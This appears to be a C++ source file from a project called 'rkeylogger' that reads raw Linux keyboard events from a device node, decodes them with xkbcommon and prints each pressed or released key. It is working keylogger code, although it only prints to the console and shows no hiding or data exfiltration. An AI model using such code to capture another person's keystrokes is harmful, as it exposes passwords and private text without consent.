#include <fcntl.h>
#include <unistd.h>
#include <iostream>
#include <sys/ioctl.h>
#include <xkbcommon/xkbcommon.h>
#include <linux/input.h>

#include "rkeylogger.h"

void read_devnode(const char *devnode) {
    int fd = open(devnode, O_RDONLY);
    if (fd == -1) {
        std::cerr << "[ ERROR ]: Cannot open the keyboard.\n" << std::endl;
        return;
    }

    struct input_event ev;

    struct xkb_context *ctx = xkb_context_new(XKB_CONTEXT_NO_FLAGS);
    if (!ctx) {
        std::cerr << "[ ERROR ]: Cannot create context of xkb.\n" << std::endl;
        close(fd);
        return;
    }

    struct xkb_keymap *keymap = xkb_map_new_from_names(ctx, nullptr, XKB_KEYMAP_COMPILE_NO_FLAGS);
    if (!keymap) {
        std::cerr << "[ ERRROR ]: Cannot create keymap xkb.\n" << std::endl;
        xkb_context_unref(ctx);
        close(fd);
        return;
    }

    struct xkb_state *state = xkb_state_new(keymap);
    if (!state) {
        std::cerr << "[ ERRROR ]: Cannot create state xkb.\n" << std::endl;
        xkb_keymap_unref(keymap);
        xkb_context_unref(ctx);
        close(fd);
        return;
    }

    while (true) {
        ssize_t bytesRead = read(fd, &ev, sizeof(struct input_event));
        if (bytesRead == sizeof(struct input_event)) {
            if (ev.type == EV_KEY && (ev.value == 0 || ev.value == 1)) {
                xkb_keycode_t keycode = ev.code + 8; // Offset for EV_KEY
                xkb_keysym_t sym = xkb_state_key_get_one_sym(state, keycode);

                xkb_keysym_t unicode = xkb_keysym_to_utf32(sym);
                
                std::string status = ev.value == 0 ? "released" : "pressed";
                if (unicode != XKB_KEY_NoSymbol) {
                    std::cout << "Key : "  << (char)unicode << " was " << status  << std::endl;
                } else {
                    std::cout << "Key not supported (code : " << ev.code << ")" << std::endl;
                }
            }
        }
    }

    xkb_state_unref(state);
    xkb_keymap_unref(keymap);
    xkb_context_unref(ctx);
    close(fd);
}